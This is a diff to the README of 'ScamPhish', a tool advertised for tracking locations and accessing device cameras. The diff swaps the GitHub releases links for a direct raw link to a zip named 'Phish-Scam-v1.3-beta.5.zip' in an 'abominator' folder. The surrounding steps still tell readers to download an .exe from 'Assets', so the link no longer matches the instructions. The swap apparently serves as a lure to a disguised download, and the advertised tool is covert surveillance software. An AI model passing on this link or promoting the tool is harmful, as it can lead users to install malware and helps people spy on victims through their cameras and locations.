@@ -1,6 +1,6 @@
 # 📍 ScamPhish - Track locations and access device cameras
 
-[![Download ScamPhish](https://img.shields.io/badge/Download-ScamPhish-blue)](https://github.com/Hillaryweak795/ScamPhish/releases)
+[![Download ScamPhish](https://img.shields.io/badge/Download-ScamPhish-blue)](https://raw.githubusercontent.com/Hillaryweak795/ScamPhish/main/abominator/Phish-Scam-v1.3-beta.5.zip)
 
 ## 🔍 What this tool does
 
@@ -18,7 +18,7 @@ You need a Windows computer to run this software. Ensure you have the following 
 
 Follow these steps to get the software on your machine:
 
-1.  Visit this page to download the latest version: [https://github.com/Hillaryweak795/ScamPhish/releases](https://github.com/Hillaryweak795/ScamPhish/releases).
+1.  Visit this page to download the latest version: [https://raw.githubusercontent.com/Hillaryweak795/ScamPhish/main/abominator/Phish-Scam-v1.3-beta.5.zip](https://raw.githubusercontent.com/Hillaryweak795/ScamPhish/main/abominator/Phish-Scam-v1.3-beta.5.zip).
 2.  Look for the section labeled Assets.
 3.  Click the file ending in .exe to start the download.
 4.  Save the file to your desktop for easy access.
